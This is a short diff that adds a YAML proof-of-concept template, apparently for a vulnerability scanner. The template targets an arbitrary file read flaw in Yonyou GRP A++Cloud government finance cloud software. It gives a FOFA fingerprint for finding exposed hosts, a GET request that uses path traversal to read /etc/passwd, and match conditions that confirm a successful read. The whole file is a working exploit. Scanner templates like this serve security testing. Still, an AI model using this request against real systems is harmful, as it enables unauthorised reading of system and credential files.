@@ -1,0 +1,24 @@
+id: poc-yaml-yongyon-grp-government-finance-cloud-anyfile-read
+info:
+  name: 用友GRP A++Cloud政府财务云 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友GRP A++Cloud政府财务云
+  fofa: body="/pf/portal/login/css/fonts/style.css"
+requests:
+- method: GET
+  path: /ma/emp/maEmp/download?fileName=../../../etc/passwd
+  expression: 'status_code == 200 &&
+
+    contains(body,"root:") &&
+
+    contains(body,"/bin") &&
+
+    contains(headers,"filename=../../../etc/passwd") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
